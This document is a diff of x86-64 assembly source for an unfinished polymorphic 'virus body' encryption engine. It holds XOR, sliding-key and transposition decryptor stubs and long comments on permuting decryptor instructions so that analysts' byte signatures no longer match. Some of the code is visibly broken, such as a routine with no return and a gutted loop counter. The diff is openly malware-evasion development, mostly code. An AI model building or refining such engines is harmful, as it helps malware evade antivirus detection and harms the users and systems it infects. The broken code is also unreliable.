@@ -269,24 +269,22 @@
 ;
 ;  simple_substitution_cipher:                             ; Adapted from [6]
 ;      simple_substitution_cipher_setup:
-;          mov     rcx, (offset payload_code_ends - offset payload_code) / 2
+;          mov     rcx, (offset virus_body_ends - offset virus_body) / 2
 ;                                                          ;  Calculate payload body size in words                         
-;          mov     rbx, offset payload_code                                                                                                
+;          mov     rbx, offset virus_body                                                                                                
 ;          mov     rsi, rbx                                ;  source = start of encrypted code                             
 ;          mov     rdi, rsi                                ;  destination = same as the source                             
 ;          mov     rbx, 029Ah                              ;  rbx = key                                                                                                                                              
 ;                                                                                                                          
 ;      simple_substitution_cipher_loop_begin:                                                                              
 ;          mov     ax, word ptr [rsi]                      ;  Essentially lodsw but better able to permutate
-;          inc     rsi
-;          inc     rsi         
 ;          xor     ax, bx                                  ;  The fundamental cipher operation          
-;          mov     word ptr [rdi], ax                            
-;          inc     rdi
-;          inc     rdi      
+;          mov     word ptr [rsi], ax                            
 ;          ;  Notice the segment must be marked RWX to modify the code.
 ;          ;  Wouldn't it be cool if the permutated decryptor made a VirtualProtect
 ;          ;  call before executing the encryption operations?
+;          inc     rsi
+;          inc     rsi   
 ;          dec     rcx
 ;          test    rcx, rcx
 ;          jnz     simple_substitution_cipher_loop_begin    
@@ -318,7 +316,7 @@
 ;  A malware analyst would just look at this and write something
 ;  like this to identify the binary pattern:
 ;
-;       2 ( 48 c7 c? 04 00 00 00 )
+;       2 ( 48 c7 c? ?? 00 00 00 )
 ; 
 ;  This is a simplified example, but apply the concept to the rest
 ;  of the code. Register permutation is not nearly enough. That b-
@@ -339,7 +337,7 @@
 ;  n the upper portions of the register will be erroneously operat-
 ;  ed on if the RAX register is used anywhere else. Dealing with 
 ;  this is simple enough - just make sure to continue using AX ins-
-;  tead of rcx. The second consequence is however more problematic;
+;  tead of rcx. The second consequence is, however, is more problematic;
 ;  the overall size of the decryptor has changed. If not dealt with,
 ;  this will destroy the ability of labels to describe the code's
 ;  logical components correctly. I can envision a couple of ways of
@@ -358,42 +356,128 @@
 ;  register. But for now, simply changing the register mode should
 ;  be enough.
 ;
+;  With a concept for permutating individual instructions in hand,
+;  we can go about describing the actual logic of the decryptor. 
+;  The initial ideas for this came from [11].
 ;
-;  [11] Provides a notation and descriptio;n for a decryption algor-
-;  ithm very similar to the ones provided by [6]. The following is
-;  an adaptation of the described algorithm and the permutation ru-
-;  les provided:
+;  First, in English:
+;
+;   1. Set the length register to the size of the code
+;   2. Set the source register to the start of the payload code
+;       (destination is the same as the source, so in the simplest
+;       case, just use that single register for both loading and storing)
+;   3. Set the key register to the value of the key
+;   4. Set the encryption register to the value of the data pointed to by 
+;       the source register
+;   5. Perform the encryption/decryption operation
+;   6. Store the result of the encryption operation at the address held in
+;       the source register
+;   7. Increment the source register by the size of the data to enc/decrypt
+;   8. Decrement the length register by the size of the data that was
+;       encrypted/decrypted. 
+;   9. Return to four if the length register is greater than zero
+;   10. Return from subroutine
+;
+;  This is a much more general description of the code than the code 
+;  itself. Notice that while this description condenses thirteen
+;  lines into ten and generalizes the registers that are used for
+;  specific operations, it is still logically eqivalent to the actual
+;  impleentation. The actual x86_64 register opcodes that are used
+;  can be interchanged, the size of the encryption operand is gener-
+;  alized, and the method of testing the counter and jumping is also
+;  generalzied. Finally, the encryption operation is generalized.
+;
+;  Another way we can generalize the cipher stub is to break it down
+;  by dependency. For example, 1-3 can be performed in any order, 
+;  4. must come after 1-3 and before 5-7 (aka it cannot be moved), 
+;  5. must precede 6., 7 must follow 6, and 8. can be placed either
+;  before or after 4., depending on where the jump label is set.
+;  9. cannot be moved; 10. also cannot be moved.
+;
+;   In a list form 
+;   -----------------------------------------------------------------------
+;      decrypt proc near  
+;        1) can be placed anywhere before 4
+;        2) can be placed anywhere before 4
+;        3) can be placed anywhere before 5
+;        4) cannot be moved
+;        5) must precede 6
+;        6) anywhere after 5 and before 7
+;        7) anywhere after 7
+;        8) anywhere after jump target around 4
+;        9) cannot be moved
+;   -----------------------------------------------------------------------
+;
+;  In this list, the symbols 1-9 dont necessarilly indicate 
+;  anything other than the logical operation, so to make 
+;  this list less confusing we can just replace those symbols
 ;
 ;   -----------------------------------------------------------------------
+;       data -> the offset of the data to perform the encryption on
 ;     decrypt proc near
-;       1)  mov length_register, length         ; get the code length       
-;       2)  mov pointer_register, startcode     ; load pointer register     
-;       3)  mov destination_register, startcode ; load the destination reg. 
-;       4)  mov key_register, key               ; get the key               
-;     main_loop
-;       5)  mov code_register, pointer_register ; take an encrypted word    
-;       6)  call unscramble                     ; decrypt it (*)            
-;       7)  mov destination_register, code_reg. ; write the decrypted word  
-;       8)  add key_register, key_increment     ; increment the key         
-;       9)  dec length_register                 ; decrement length          
-;       10) inc pointer_register                ; increment pointer (x2)    
-;       11) jnz main_loop                       ; loop until length=0       
-;       12) ret                                 ; return pc                 
-;     decrypt endp                                                  fig. 4
-;   -----------------------------------------------------------------------
-;       1) permutable, can be placed anywhere
-;       2) permutable, can be placed anywhere
-;       3) permutable, can be placed anywhere
-;       4) permutable, can be placed anywhere
-;       5) not permutable
-;       6) not permutable
-;       7) permutable, can be placed anywhere after [6]
-;       8) permutable, can be placed anywhere after [6]
-;       9) permutable, can be placed anywhere after [6]
-;       10) permutable, can be placed anywhere after [6]
-;       11) not permutable
-;       12) not permutable                                          fig. 5                    
-;   -----------------------------------------------------------------------
+;       sl -> set length register; can be placed anywhere before lod
+;       ss -> set source register; can be placed anywhere before lod
+;       sk -> set the key register; can be placed anywhere before enc
+;       lod -> set encryption register to the data to encrypt; not permutable
+;       enc -> perform the encryption operation; must proceed lod and preceed stor
+;       stor -> set the memory refernced by ss to result of enc; must prceed enc and precede sinc
+;       sdelta -> set source register new offset of source; must proceed stor
+;       ldelta -> set the length register to the new offset of source; can be placed anywhere around 4
+;       jnext -> jump to lod if not finished
+;       fin -> return or continue to separate logic block
+;
+;  By assigning these symbols to each logical instruction, we can
+;  pick out some interesting characteristics of the algorithm. First,
+;  while the actions of sl and ss must precede lod, the data to describe
+;  these actions need not precede the lod instruction. The second
+;  is that there is an important relationship between sdelta nd ldelta;
+;  anytime the first changes, the other must also change. Therefore
+;  it does not matter if sdelta == ldelta or whether sdelta ~ ldelta.
+;  This means that we can simplify sdelta and ldelta to cdelta,
+;  meaning the change in value with respect to either the source
+;  beginning or end. Finally, generalizing the test + jmp to jnext
+;  allows us to think about the comparison operation independent 
+;  of whether we're interpreting cdelta as sdelta == ldelta.
+;  Since we have simplified sdelta and ldelta to cdelta, we can
+;  imagine that the expression jnext is dependent on the expression
+;  of cdelta.
+
+;  At this point, we have the following information:
+;       
+;     - what operations are included in the cipher,
+;     - their dependencies to each other,
+;     - the relationship between the source register and the length
+;       register
+;     - the relationship between cdelta and jnext                 
+;
+;  In terms of actual code, we can represent the operations as
+;  a matrix of bytes just as in [11] and can code our permutation
+;  to mutate with respect to dependencies:
+;                                    ___ after stor.   ____ not perm.
+;  default)                         /                 /
+;     [1,  2,  3,  4,   5,   6,    7,      8,      9,     10]
+;     [sl, ss, sk, lod, enc, stor, sdelta, ldelta, jnext, fin]
+;      \_______/    \_   \______ \_________    \______      \_____
+;         |           \         \          \          \           \
+; permutable   not perm.    before stor  after enc   after lod   not perm.
+;
+;  permutation a)
+;     [ss, sl, sk, lod, ldelta, enc, stor, sdelta, jnext, fin]
+;
+;  permutation b)
+;     [sk, sl, ss, lod, ldelta, enc, stor, sdelta, jnex, fin]
+;
+;  The engine will create a matrix of bytes with random orders
+;  of values (except for the impermutable enc, jnext, and fin).
+;  The algorithm is something like this (in this case we'll
+;  revert to notating them by number):
+;
+;    1) create a variable that will hold the matrix of bytes
+;    2) set the impermutable indexes to themselves
+;    3) in a loop, fill in the first three (or four, depending
+;       on where you're decrementing lreg) in a random order
+;    4) call the code generation routine for each routine in 
+;       the order
 ;
 ;  Just as in [11], this general description of the algorithm with 
 ;  permutation rules can be used to "make a matrix of bytes". In
@@ -438,6 +522,7 @@
 
 option win64:3      ; init shadow space, reserve stack at PROC level
 
+include .\polytest.inc
 ;-----------------------------------------------------------------------------
 ;  Operating Mode Constants, Structs, and Macros
 ;-----------------------------------------------------------------------------
@@ -481,148 +566,6 @@ GetIP:
     pop     reg 
     add     reg, offset expr - offset GetIP
 endm
-;-----------------------------------------------------------------------------
-;  Skeleton Opcode Table
-;-----------------------------------------------------------------------------
-; Notes:
-;   - Registers encodings for r8-r15 operands not yet supported
-;   - Is there probably a faster/smaller way to write this? Probably.
-;     But that would be less clear and nothing beats lots of practice
-;   - Opcodes marked 64 include r16/r32/64 (or immediate)
-;   - The first two sets of opcodes are show in base-2 for visualization
-;     Remaining opcodes are shown in base-16
-
-SKELETON_TABLE struct
-; ADD series
-OP_ADD_RM8_R8     BYTE 00000000b
-OP_ADD_RM64_R64   BYTE 00000001b 
-OP_ADD_R8_M8      BYTE 00000001b
-OP_ADD_R64_RM64   BYTE 00000010b
-OP_ADD_AL_IMM8    BYTE 00000101b 
-OP_ADD_AX_IMM32   BYTE 00000110b
-OP_ADD_RM8_IMM8   WORD 1000001111000000b                        ; Moving an imm8 into a 16 bit register is done with opcode 0x83 
-OP_ADD_RM64_IMM32 WORD 1000000111000000b                        ; and the opcode extension field of the ModR/M byte set to 0
-OP_ADD_RM64_IMM8  WORD 1000001111000000b
-
-; OR series
-OP_OR_RM8_R8      BYTE 00001000b 
-OP_OR_RM64_R64    BYTE 00000101b
-OP_OR_R8_RM8      BYTE 00001010b 
-OP_OR_R64_RM64    BYTE 00001011b 
-OP_OR_AL_IMM8     BYTE 00001100b 
-OP_OR_AX_IMM32    BYTE 00001101b
-OP_OR_RM8_IMM8    WORD 1000000011000001b
-OP_OR_RM64_IMM32  WORD 1000000111000001b
-OP_OR_RM64_IMM8   WORD 1000001111000001b
-
-OP_AND_RM8_R8     BYTE 20h
-OP_AND_RM64_R64   BYTE 21h
-OP_AND_R8_RM8     BYTE 22h
-OP_AND_R64_RM64   BYTE 23h
-OP_AND_AL_IMM8    BYTE 24h
-OP_AND_AX_IMM32   BYTE 25h
-OP_AND_RM8_IMM8   WORD 80C4h
-OP_AND_RM64_IMM32 WORD 81C4h
-OP_AND_RM64_IMM8  WORD 83C4h
-
-OP_SUB_RM8_R8     BYTE 28h
-OP_SUB_RM64_R64   BYTE 29h
-OP_SUB_R8_RM8     BYTE 2Ah
-OP_SUB_R64_RM64   BYTE 2Bh
-OP_SUB_AL_IMM8    BYTE 2Ch
-OP_SUB_AX_IMM32   BYTE 2Dh
-OP_SUB_RM8_IMM8   WORD 80C5h
-OP_SUB_RM64_IMM32 WORD 81C5h
-OP_SUB_RM64_IMM8  WORD 83C5h
-
-OP_XOR_RM8_R8     BYTE 30h
-OP_XOR_RM64_R64   BYTE 31h
-OP_XOR_R8_RM8     BYTE 32h
-OP_XOR_R64_RM64   BYTE 33h
-OP_XOR_AL_IMM8    BYTE 34h
-OP_XOR_AX_IMM32   BYTE 35h
-OP_XOR_RM8_IMM8   WORD 80C6h
-OP_XOR_RM64_IMM32 WORD 81C6h
-OP_XOR_RM64_IMM8  WORD 83C6h
-
-OP_CMP_RM8_R8     BYTE 38h
-OP_CMP_RM64_R64   BYTE 39h
-OP_CMP_R8_RM8     BYTE 3Ah
-OP_CMP_R64_RM64   BYTE 3Bh
-OP_CMP_AL_IMM8    BYTE 3Ch
-OP_CMP_AX_IMM32   BYTE 3Dh
-OP_CMP_RM8_IMM8   WORD 80C7h
-OP_CMP_RM64_IMM32 WORD 81C7h
-OP_CMP_RM64_IMM8  WORD 83C7h
-
-OP_MOV_RM8_R8     BYTE 88h
-OP_MOV_RM64_R64   BYTE 89h
-OP_MOV_R8_RM8     BYTE 8Ah
-OP_MOV_R64_RM64   BYTE 8Bh
-OP_MOV_RL_IMM8    BYTE 0B0h                                     ;  AND the opcode with the dest register!
-OP_MOV_R64_IMM64  BYTE 0B8h                                     ;  AND the opcode with the dest register!
-OP_MOV_RM8_IMM8   BYTE 0C6C0h
-OP_MOV_RM64_IMM32 BYTE 0C7C0h
-
-OP_LOOP_CX_RE18   BYTE 0E2h
-; MOD (mode) encodings
-;
-MOD_REG     BYTE 11000000b
-MOD_DISP_4B BYTE 10000000b
-MOD_DISP_1B BYTE 01000000b
-MOD_REG_IND BYTE 00000000b
-
-; SIB (scale) encodings
-;
-SIB_SCALE_1 BYTE 00000000b
-SIB_SCALE_2 BYTE 01000000b
-SIB_SCALE_3 BYTE 10000000b
-SIB_SCALE_4 BYTE 11000000b
-
-; Register encodings
-;
-REG_AX      BYTE 00000000b
-REG_BX      BYTE 00011000b
-REG_CX      BYTE 00001000b
-REG_DX      BYTE 00010000b
-REG_SP      BYTE 00100000b
-REG_BP      BYTE 00101000b
-REG_DI      BYTE 00111000b
-REG_SI      BYTE 00110000b
-
-;  r/m16/32/64 operands
-;               |SRCDST|
-REG_AX_SRC  BYTE 00000000b
-REG_BX_SRC  BYTE 00011000b
-REG_CX_SRC  BYTE 00001000b
-REG_DX_SRC  BYTE 00010000b
-REG_SP_SRC  BYTE 00100000b
-REG_BP_SRC  BYTE 00101000b
-REG_DI_SRC  BYTE 00111000b
-REG_SI_SRC  BYTE 00110000b
-
-REG_AX_DST  BYTE 00000000b
-REG_BX_DST  BYTE 00000011b
-REG_CX_DST  BYTE 00000001b
-REG_DX_DST  BYTE 00000010b
-REG_SP_DST  BYTE 00000100b
-REG_BP_DST  BYTE 00000101b
-REG_SI_DST  BYTE 00000110b
-REG_DI_DST  BYTE 00000111b
-
-; REX byte for normal operations
-;
-REX_W       BYTE 01001000b
-REX_WB      BYTE 01001001b
-
-; Non-64 bit prefixes
-;
-PREFIX_OP_8  BYTE 10001000b
-PREFIX_OP_16 BYTE 00010110b
-PREFIX_OP_32 BYTE 00101001b
-; r8-r15 registers are encoded using a different REX prefix
-; this should be implemented in later revisions
-SKELETON_TABLE ends
 
 DATA$00 SEGMENT PAGE 'DATA'
 
@@ -631,39 +574,26 @@ DATA$00 ENDS
 TEXT$00 SEGMENT ALIGN(10h) 'CODE' READ WRITE EXECUTE
 
     Main PROC	
-        call    simple_substitution_cipher
-        call    simple_substitution_cipher
-        call    sliding_key_cipher
-        call    sliding_key_cipher
-        call    long_key_cipher
-        call    long_key_cipher
-        call    transposition_cipher
-        call    transposition_cipher
+        call TransformCipher
         ret
     Main ENDP
 
+virus_body:
 ;-----------------------------------------------------------------------------
 ;  Poly Engine
 ;-----------------------------------------------------------------------------
 
-    Regenerate PROC
-        ; Combining polymorphism and oligomorphism - get a random number to
-        ; choose the cipher proc      
+    TransformCipher PROC   
         local   dwCipherIndex:DWORD          
         local   qwCipherStart:QWORD
         local   qwCipherEnd:QWORD
         local   dwCipherLen:DWORD
         local   RegTable:REG_TABLE
         local   SkeletonTable:SKELETON_TABLE
-        mov     rcx, 2                                  ;  Start with the more-simple ciphers
+        mov     rcx, 2                                  ;  
         call    get_rand_from_range                     ;  Get a random number in the range
-        mov     [dwCipherIndex], eax                    ;  Save the index
-        test    rax, rax                                ;  Is it 0?
-        jz      _case_cipher_0
-        cmp     rax, 1
-        je      _case_cipher_1
-        jmp     _case_cipher_2
-    _case_cipher_0:
+        call    get_rand_reg_2  
+
         mov     rax, offset simple_substitution_cipher
         mov     qwCipherStart, rbx
         mov     rbx, offset simple_substitution_cipher_end
@@ -674,20 +604,11 @@ TEXT$00 SEGMENT ALIGN(10h) 'CODE' READ WRITE EXECUTE
         ;  Get the first random register
         call    get_rand_reg
 
-
-        ; Initialize the members of RegTable to random values
         
-    ; ToDo
-    _case_cipher_1:
-    jmp _regenerate_end
-
-    ;ToDo
-    _case_cipher_2:
-    jmp _regenerate_end
 
     _regenerate_end:
         ret
-    Regenerate ENDP
+    TransformCipher ENDP
 ;-----------------------------------------------------------------------------
 ;  Encryption Primitives
 ;-----------------------------------------------------------------------------
@@ -696,21 +617,21 @@ TEXT$00 SEGMENT ALIGN(10h) 'CODE' READ WRITE EXECUTE
 ;
 simple_substitution_cipher:
     simple_substitution_cipher_setup:
-        mov     rcx, (offset payload_code_ends - offset payload_code) / 2
+        mov     rcx, (offset virus_body_ends - offset virus_body) / 2
                                                         ;  Calculate payload body size in words                         
-        mov     rbx, offset payload_code                                                                                                
+        mov     rbx, offset virus_body                                                                                                
         mov     rsi, rbx                                ;  source = start of encrypted code                             
         mov     rdi, rsi                                ;  destination = same as the source                             
         mov     rbx, 029Ah                              ;  rbx = key                                                                                                                                              
                                                                                                                         
     simple_substitution_cipher_loop_begin:                                                                              
         mov     ax, word ptr [rsi]                      ;  Essentially lodsw but better able to permutate
-        inc     rsi
-        inc     rsi         
+        ;inc     rsi
+        ;inc     rsi         
         xor     ax, bx                                  ;  The fundamental cipher operation          
-        mov     word ptr [rdi], ax                            
-        inc     rdi
-        inc     rdi      
+        mov     word ptr [rsi], ax                      ;  Could also be RDI  
+        inc     rsi
+        inc     rsi      
         ;  Notice the segment must be marked RWX to modify the code.
         ;  Wouldn't it be cool if the permutated decryptor made a VirtualProtect
         ;  call before executing the encryption operations?
@@ -724,8 +645,8 @@ simple_substitution_cipher:
 ;
 sliding_key_cipher:
     sliding_key_cipher_setup:
-        mov     rcx, (offset payload_code_ends - offset payload_code) / 2
-        mov     rbx, offset payload_code
+        mov     rcx, (offset virus_body_ends - offset virus_body) / 2
+        mov     rbx, offset virus_body
         mov     rsi, rbx                                ;  source = start of encrypted code
         mov     rdi, rsi                                ;  destination = same as source
         mov     rbx, 02828h                             ;  bx = decryption key
@@ -742,8 +663,8 @@ sliding_key_cipher:
 ;
 long_key_cipher:
     long_key_cipher_setup:
-        mov     rbx, offset payload_code
-        mov     rcx, offset payload_code_ends
+        mov     rbx, offset virus_body
+        mov     rcx, offset virus_body_ends
         sub     rcx, rbx
         shr     cx, 1                                   ;  Calculate payload body size in words 
 
@@ -767,15 +688,15 @@ long_key_cipher:
         ret    
 
     long_key:
-        dq      0FEEDDEADBEEFh
+        dq      0FEADDEADBEEFh
     long_key_ends:
 
 ;   Transposition (Order) Encryption [6] (TODO: Make this work)
 ;
 transposition_cipher:
     transposition_cipher_setup:
-        mov     rcx, (offset payload_code_ends - offset payload_code) / 2
-        mov     rsi, offset payload_code                ;  source = start of encrypted code
+        mov     rcx, (offset virus_body_ends - offset virus_body) / 2
+        mov     rsi, offset virus_body                ;  source = start of encrypted code
         mov     rdi, rsi                                ;  dest = same as source
 
     transposition_cipher_loop_start:
@@ -825,17 +746,23 @@ get_rand_reg:
     je      get_rand_reg
     ret
 
+get_rand_reg_2:
+    call  get_rand
+    shr   rax, 59
+    xor   rdx, rdx
+    mov   rcx, 10
+    div   rcx
+    mov   rax, rcx
+
 ; Get a random number from a range
 ; uint64 RandFromRange(rcx=max)
 get_rand_from_range:
     push    rcx                                        ;  Store the max value
     call    get_rand_seed                              ;  Get a uint64 seed
     mov     rcx, rax                                   ;  Move the seed to param_1
-    call    get_rand                                   ;  Get a random uint64
-    xor     rcx, rcx                                   ;  Create a counter
+    call    get_rand                                   ;  Get a random uint6
 _rand_range_loop:
     shr     rcx, 1                                     ;  Remove one bit place
-    inc     rcx                                        ;  Increment the counter
     test    rcx, rcx                                   ;  Did that shift zero it?
     jnz     _rand_range_loop                           ;  No, there's more data. 
     mov     r8, 64                                     ;  Max number of places
@@ -852,12 +779,7 @@ _rand_range_loop:
 ;  Payload Code
 ;-----------------------------------------------------------------------------
 
-payload_code:
-    mov     rax, 1
-    ret
-    nop
-
-payload_code_ends:
+virus_body_ends:
 
 TEXT$00 ENDS
 
